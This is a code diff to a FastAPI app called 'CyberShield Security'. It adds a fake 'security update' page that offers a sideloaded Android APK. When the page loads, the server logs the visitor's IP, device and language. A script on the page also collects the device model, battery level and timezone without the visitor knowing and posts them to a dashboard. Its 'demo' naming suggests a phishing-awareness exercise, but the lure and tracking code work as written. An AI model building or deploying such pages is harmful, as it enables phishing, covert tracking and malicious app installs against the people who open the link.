@@ -6,13 +6,17 @@ from pathlib import Path
 import uuid
 import html
 
+
 app = FastAPI(title="CyberShield Security")
+
 
 BASE_DIR = Path(__file__).resolve().parent
 APK_PATH = BASE_DIR / "demo_files" / "CyberShieldAPK.apk"
 
 
+# ============================================================
 # DATA MODEL
+# ============================================================
 
 class DemoEvent(BaseModel):
 
@@ -30,11 +34,16 @@ class DemoEvent(BaseModel):
     timezone: str = "Unknown"
 
 
-# Temporary in-memory storage
+# ============================================================
+# TEMPORARY IN-MEMORY STORAGE
+# ============================================================
+
 events = []
 
 
+# ============================================================
 # HELPER - GET CLIENT IP
+# ============================================================
 
 def get_client_ip(request: Request):
 
@@ -51,7 +60,124 @@ def get_client_ip(request: Request):
     return "UNKNOWN"
 
 
+# ============================================================
+# HELPER - GET ANDROID VERSION
+# ============================================================
+
+def extract_android_version(user_agent: str):
+
+    try:
+
+        if "Android" in user_agent:
+
+            part = user_agent.split("Android", 1)[1]
+
+            part = part.strip()
+
+            if ";" in part:
+
+                version = part.split(";", 1)[0].strip()
+
+            elif ")" in part:
+
+                version = part.split(")", 1)[0].strip()
+
+            else:
+
+                version = part.split(" ", 1)[0].strip()
+
+            return version
+
+    except Exception:
+
+        pass
+
+    return "Unknown"
+
+
+# ============================================================
+# HELPER - GET DEVICE INFORMATION
+# ============================================================
+
+def extract_device_info(user_agent: str):
+
+    manufacturer = "Unknown"
+    device = "Unknown"
+
+    try:
+
+        # Common Android User-Agent example:
+        #
+        # Mozilla/5.0 (Linux; Android 13; SM-A525F)
+        # AppleWebKit/537.36 ...
+        #
+        if "Android" in user_agent:
+
+            android_part = user_agent.split("Android", 1)[1]
+
+            if ";" in android_part:
+
+                device_part = android_part.split(";", 1)[1]
+
+                if ")" in device_part:
+
+                    device_part = device_part.split(")", 1)[0]
+
+                device_part = device_part.strip()
+
+                if device_part:
+
+                    device = device_part
+
+                    # Basic manufacturer detection
+                    device_upper = device.upper()
+
+                    if "SAMSUNG" in device_upper or device_upper.startswith("SM-"):
+
+                        manufacturer = "Samsung"
+
+                    elif "PIXEL" in device_upper:
+
+                        manufacturer = "Google"
+
+                    elif "ONEPLUS" in device_upper:
+
+                        manufacturer = "OnePlus"
+
+                    elif "XIAOMI" in device_upper or device_upper.startswith("MI"):
+
+                        manufacturer = "Xiaomi"
+
+                    elif "REDMI" in device_upper:
+
+                        manufacturer = "Xiaomi"
+
+                    elif "VIVO" in device_upper:
+
+                        manufacturer = "Vivo"
+
+                    elif "OPPO" in device_upper:
+
+                        manufacturer = "Oppo"
+
+                    elif "REALME" in device_upper:
+
+                        manufacturer = "Realme"
+
+                    elif "MOTOROLA" in device_upper or device_upper.startswith("MOTO"):
+
+                        manufacturer = "Motorola"
+
+    except Exception:
+
+        pass
+
+    return manufacturer, device
+
+
+# ============================================================
 # ROOT
+# ============================================================
 
 @app.get("/")
 def root():
@@ -61,18 +187,25 @@ def root():
     }
 
 
+# ============================================================
 # GET ALL EVENTS
+# ============================================================
 
 @app.get("/api/demo/events")
 def get_events():
 
     return {
+
         "total": len(events),
+
         "events": events
+
     }
 
 
+# ============================================================
 # CLEAR EVENTS
+# ============================================================
 
 @app.delete("/api/demo/events")
 def clear_events():
@@ -80,12 +213,17 @@ def clear_events():
     events.clear()
 
     return {
+
         "success": True,
+
         "message": "Demo events cleared"
+
     }
 
 
-# RECEIVE ANDROID EVENT
+# ============================================================
+# RECEIVE ANDROID / BROWSER EVENT
+# ============================================================
 
 @app.post("/api/demo/event")
 async def receive_demo_event(
@@ -97,9 +235,11 @@ async def receive_demo_event(
 
     event = {
 
-        "id": str(uuid.uuid4())[:8],
+        "id":
+            str(uuid.uuid4())[:8],
 
-        "event": data.event,
+        "event":
+            data.event,
 
         "device_manufacturer":
             data.device_manufacturer,
@@ -129,42 +269,71 @@ async def receive_demo_event(
             datetime.now().strftime(
                 "%Y-%m-%d %H:%M:%S"
             )
+
     }
 
     events.append(event)
 
+
+    # --------------------------------------------------------
     # SERVER CONSOLE
+    # --------------------------------------------------------
 
     print("\n========== SECURITY EVENT ==========")
 
-    print("Event:",
-          data.event)
+    print(
+        "Event:",
+        data.event
+    )
 
-    print("Device:",
-          f"{data.device_manufacturer} {data.device}")
+    print(
+        "Device:",
+        f"{data.device_manufacturer} {data.device}"
+    )
 
-    print("Android:",
-          data.android_version)
+    print(
+        "Android:",
+        data.android_version
+    )
 
-    print("SDK:",
-          data.android_sdk)
+    print(
+        "SDK:",
+        data.android_sdk
+    )
 
-    print("Battery:",
-          f"{data.battery_percent}%")
+    print(
+        "Battery:",
+        f"{data.battery_percent}%"
+    )
 
-    print("Locale:",
-          data.locale)
+    print(
+        "Locale:",
+        data.locale
+    )
 
-    print("Timezone:",
-          data.timezone)
+    print(
+        "Timezone:",
+        data.timezone
+    )
 
-    print("IP:",
-          client_ip)
+    print(
+        "IP:",
+        client_ip
+    )
 
-    print("Time:",
-          event["time"])
+    print(
+        "Time:",
+        event["time"]
+    )
 
-    print("====================================\n")
+    print(
+        "Event ID:",
+        event["id"]
+    )
+
+    print(
+        "====================================\n"
+    )
 
 
     return {
@@ -179,10 +348,14 @@ async def receive_demo_event(
 
         "event_id":
             event["id"]
+
     }
 
 
+# ============================================================
 # DOWNLOAD APK
+# ============================================================
+
 @app.get("/download-apk")
 def download_apk():
 
@@ -195,6 +368,7 @@ def download_apk():
 
             "expected_path":
                 str(APK_PATH)
+
         }
 
     return FileResponse(
@@ -206,18 +380,155 @@ def download_apk():
 
         filename=
             "CyberShieldAPK.apk"
+
     )
 
 
+# ============================================================
 # SECURITY UPDATE PAGE
+# ============================================================
 
 @app.get(
     "/security-update",
     response_class=HTMLResponse
 )
-def security_update_page():
+def security_update_page(request: Request):
 
-    return """
+    # --------------------------------------------------------
+    # GET INFORMATION AVAILABLE DIRECTLY FROM HTTP REQUEST
+    # --------------------------------------------------------
+
+    client_ip = get_client_ip(request)
+
+    user_agent = request.headers.get(
+        "user-agent",
+        "Unknown"
+    )
+
+    accept_language = request.headers.get(
+        "accept-language",
+        "Unknown"
+    )
+
+
+    # --------------------------------------------------------
+    # TRY TO DETECT DEVICE FROM USER-AGENT
+    # --------------------------------------------------------
+
+    android_version = extract_android_version(
+        user_agent
+    )
+
+    manufacturer, device = extract_device_info(
+        user_agent
+    )
+
+
+    # --------------------------------------------------------
+    # CREATE INITIAL LINK OPENED EVENT
+    # --------------------------------------------------------
+
+    event = {
+
+        "id":
+            str(uuid.uuid4())[:8],
+
+        "event":
+            "LINK OPENED",
+
+        "device_manufacturer":
+            manufacturer,
+
+        "device":
+            device,
+
+        "android_version":
+            android_version,
+
+        "android_sdk":
+            0,
+
+        "battery_percent":
+            -1,
+
+        "locale":
+            accept_language,
+
+        "timezone":
+            "Unknown",
+
+        "ip":
+            client_ip,
+
+        "time":
+            datetime.now().strftime(
+                "%Y-%m-%d %H:%M:%S"
+            )
+
+    }
+
+
+    # --------------------------------------------------------
+    # STORE INITIAL EVENT
+    # --------------------------------------------------------
+
+    events.append(event)
+
+
+    # --------------------------------------------------------
+    # SERVER CONSOLE
+    # --------------------------------------------------------
+
+    print("\n========== SECURITY EVENT ==========")
+
+    print("Event: LINK OPENED")
+
+    print(
+        "Device:",
+        f"{manufacturer} {device}"
+    )
+
+    print(
+        "Android:",
+        android_version
+    )
+
+    print(
+        "Battery: Browser data pending"
+    )
+
+    print(
+        "Locale:",
+        accept_language
+    )
+
+    print(
+        "Timezone: Browser data pending"
+    )
+
+    print(
+        "IP:",
+        client_ip
+    )
+
+    print(
+        "Time:",
+        event["time"]
+    )
+
+    print(
+        "Event ID:",
+        event["id"]
+    )
+
+    print("====================================\n")
+
+
+    # --------------------------------------------------------
+    # SECURITY UPDATE HTML
+    # --------------------------------------------------------
+
+    return f"""
 
     <!DOCTYPE html>
 
@@ -237,7 +548,7 @@ def security_update_page():
 
         <style>
 
-            body {
+            body {{
 
                 font-family: Arial;
 
@@ -255,10 +566,10 @@ def security_update_page():
 
                 padding: 20px;
 
-            }
+            }}
 
 
-            .card {
+            .card {{
 
                 background: white;
 
@@ -274,17 +585,17 @@ def security_update_page():
                     0 4px 20px
                     rgba(0,0,0,.15);
 
-            }
+            }}
 
 
-            .icon {
+            .icon {{
 
                 font-size: 55px;
 
-            }
+            }}
 
 
-            .warning {
+            .warning {{
 
                 background: #fff3cd;
 
@@ -294,10 +605,10 @@ def security_update_page():
 
                 margin-top: 15px;
 
-            }
+            }}
 
 
-            a {
+            a {{
 
                 display: block;
 
@@ -315,7 +626,7 @@ def security_update_page():
 
                 font-weight: bold;
 
-            }
+            }}
 
         </style>
 
@@ -364,6 +675,348 @@ def security_update_page():
         </div>
 
 
+        <script>
+
+        // ====================================================
+        // COLLECT BROWSER / DEVICE INFORMATION
+        // ====================================================
+
+        async function collectDeviceInformation() {{
+
+            try {{
+
+                let deviceManufacturer = "Unknown";
+
+                let device = "Unknown";
+
+                let androidVersion = "Unknown";
+
+                let androidSDK = 0;
+
+                let batteryPercent = -1;
+
+                let locale =
+                    navigator.language || "Unknown";
+
+                let timezone = "Unknown";
+
+
+                // ------------------------------------------------
+                // USER AGENT
+                // ------------------------------------------------
+
+                const userAgent =
+                    navigator.userAgent || "";
+
+
+                // ------------------------------------------------
+                // ANDROID VERSION
+                // ------------------------------------------------
+
+                const androidMatch =
+                    userAgent.match(
+                        /Android\\s([0-9.]+)/i
+                    );
+
+                if (androidMatch) {{
+
+                    androidVersion =
+                        androidMatch[1];
+
+                }}
+
+
+                // ------------------------------------------------
+                // DEVICE MODEL
+                // ------------------------------------------------
+
+                if (androidMatch) {{
+
+                    const deviceMatch =
+                        userAgent.match(
+                            /Android\\s[0-9.]+;\\s*([^;)]+)/i
+                        );
+
+                    if (deviceMatch) {{
+
+                        device =
+                            deviceMatch[1].trim();
+
+                    }}
+
+                }}
+
+
+                // ------------------------------------------------
+                // MANUFACTURER
+                // ------------------------------------------------
+
+                const deviceUpper =
+                    device.toUpperCase();
+
+
+                if (
+                    deviceUpper.includes("SAMSUNG") ||
+                    deviceUpper.startsWith("SM-")
+                ) {{
+
+                    deviceManufacturer =
+                        "Samsung";
+
+                }}
+
+                else if (
+                    deviceUpper.includes("PIXEL")
+                ) {{
+
+                    deviceManufacturer =
+                        "Google";
+
+                }}
+
+                else if (
+                    deviceUpper.includes("ONEPLUS")
+                ) {{
+
+                    deviceManufacturer =
+                        "OnePlus";
+
+                }}
+
+                else if (
+                    deviceUpper.includes("XIAOMI") ||
+                    deviceUpper.startsWith("MI")
+                ) {{
+
+                    deviceManufacturer =
+                        "Xiaomi";
+
+                }}
+
+                else if (
+                    deviceUpper.includes("REDMI")
+                ) {{
+
+                    deviceManufacturer =
+                        "Xiaomi";
+
+                }}
+
+                else if (
+                    deviceUpper.includes("VIVO")
+                ) {{
+
+                    deviceManufacturer =
+                        "Vivo";
+
+                }}
+
+                else if (
+                    deviceUpper.includes("OPPO")
+                ) {{
+
+                    deviceManufacturer =
+                        "Oppo";
+
+                }}
+
+                else if (
+                    deviceUpper.includes("REALME")
+                ) {{
+
+                    deviceManufacturer =
+                        "Realme";
+
+                }}
+
+                else if (
+                    deviceUpper.includes("MOTOROLA") ||
+                    deviceUpper.includes("MOTO")
+                ) {{
+
+                    deviceManufacturer =
+                        "Motorola";
+
+                }}
+
+
+                // ------------------------------------------------
+                // ANDROID SDK
+                // ------------------------------------------------
+                // Modern browsers usually don't expose the exact
+                // Android SDK version directly.
+                //
+                // Therefore we leave it as 0 unless available.
+
+                if (
+                    navigator.userAgentData &&
+                    navigator.userAgentData.getHighEntropyValues
+                ) {{
+
+                    try {{
+
+                        const uaData =
+                            await navigator.userAgentData
+                                .getHighEntropyValues([
+                                    "platform",
+                                    "platformVersion",
+                                    "model"
+                                ]);
+
+
+                        if (
+                            uaData.platform === "Android"
+                        ) {{
+
+                            if (uaData.platformVersion) {{
+
+                                androidVersion =
+                                    uaData.platformVersion;
+
+                            }}
+
+
+                            if (uaData.model) {{
+
+                                device =
+                                    uaData.model;
+
+                            }}
+
+                        }}
+
+                    }} catch (error) {{
+
+                        console.log(
+                            "User-Agent data unavailable"
+                        );
+
+                    }}
+
+                }}
+
+
+                // ------------------------------------------------
+                // TIMEZONE
+                // ------------------------------------------------
+
+                try {{
+
+                    timezone =
+                        Intl.DateTimeFormat()
+                            .resolvedOptions()
+                            .timeZone || "Unknown";
+
+                }} catch (error) {{
+
+                    timezone = "Unknown";
+
+                }}
+
+
+                // ------------------------------------------------
+                // BATTERY
+                // ------------------------------------------------
+
+                if (
+                    navigator.getBattery
+                ) {{
+
+                    try {{
+
+                        const battery =
+                            await navigator.getBattery();
+
+                        batteryPercent =
+                            Math.round(
+                                battery.level * 100
+                            );
+
+                    }} catch (error) {{
+
+                        batteryPercent = -1;
+
+                    }}
+
+                }}
+
+
+                // ------------------------------------------------
+                // SEND INFORMATION TO BACKEND
+                // ------------------------------------------------
+
+                const response =
+                    await fetch(
+                        "/api/demo/event",
+                        {{
+
+                            method: "POST",
+
+                            headers: {{
+
+                                "Content-Type":
+                                    "application/json"
+
+                            }},
+
+                            body: JSON.stringify({{
+
+                                event:
+                                    "LINK OPENED",
+
+                                device_manufacturer:
+                                    deviceManufacturer,
+
+                                device:
+                                    device,
+
+                                android_version:
+                                    androidVersion,
+
+                                android_sdk:
+                                    androidSDK,
+
+                                battery_percent:
+                                    batteryPercent,
+
+                                locale:
+                                    locale,
+
+                                timezone:
+                                    timezone
+
+                            }})
+
+                        }}
+                    );
+
+
+                if (response.ok) {{
+
+                    console.log(
+                        "CyberShield: Device information sent"
+                    );
+
+                }}
+
+            }} catch (error) {{
+
+                console.log(
+                    "CyberShield device information error:",
+                    error
+                );
+
+            }}
+
+        }}
+
+
+        // Run automatically when page opens
+        collectDeviceInformation();
+
+        </script>
+
+
     </body>
 
     </html>
@@ -371,7 +1024,9 @@ def security_update_page():
     """
 
 
+# ============================================================
 # DASHBOARD
+# ============================================================
 
 @app.get(
     "/dashboard",
@@ -389,62 +1044,93 @@ def dashboard():
         <tr>
 
             <td>
-                {html.escape(str(event["time"]))}
+                {html.escape(
+                    str(event["time"])
+                )}
             </td>
 
-            <td>
-                {html.escape(str(event["event"]))}
-            </td>
 
             <td>
                 {html.escape(
+                    str(event["event"])
+                )}
+            </td>
+
+
+            <td>
+
+                {html.escape(
                     str(event["device_manufacturer"])
                 )}
+
                 <br>
 
                 <b>
+
                     {html.escape(
                         str(event["device"])
                     )}
+
                 </b>
+
             </td>
 
+
             <td>
+
                 Android
                 {html.escape(
                     str(event["android_version"])
                 )}
+
                 <br>
+
                 SDK:
                 {event["android_sdk"]}
+
             </td>
 
+
             <td>
+
                 {event["battery_percent"]}%
+
             </td>
 
+
             <td>
+
                 {html.escape(
                     str(event["ip"])
                 )}
+
             </td>
 
+
             <td>
+
                 {html.escape(
                     str(event["locale"])
                 )}
+
             </td>
 
+
             <td>
+
                 {html.escape(
                     str(event["timezone"])
                 )}
+
             </td>
 
+
             <td>
+
                 {html.escape(
                     str(event["id"])
                 )}
+
             </td>
 
         </tr>
